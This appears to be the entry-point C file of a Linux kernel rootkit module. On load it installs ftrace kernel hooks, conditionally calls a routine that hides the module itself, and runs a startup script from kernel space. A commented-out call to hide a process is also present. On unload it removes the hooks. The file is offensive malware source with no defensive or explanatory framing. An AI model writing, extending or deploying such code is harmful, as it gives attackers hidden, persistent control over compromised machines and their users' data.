#pragma GCC optimize("-fno-optimize-sibling-calls")

#include "header_files/linux_headers.h"
#include "header_files/rk_vars.h"
#include "hooks/utils.c"
#include "ftrace_install/rk_ftrace.h"
#include "ftrace_install/rk_ftrace_hooks.h"
#include "header_files/utils.h"

static int rk_start(void) {
	int err;
        
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));

	#ifdef CONFIG_AUTO_HIDE
		rk_hide();
	#endif
	
	run_cmd(STARTUP_SCRIPT);
	//hide_proc(1);

	return 0;
}

static void rk_end(void) {
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Gr4 @ @");
module_init(rk_start);
module_exit(rk_end);
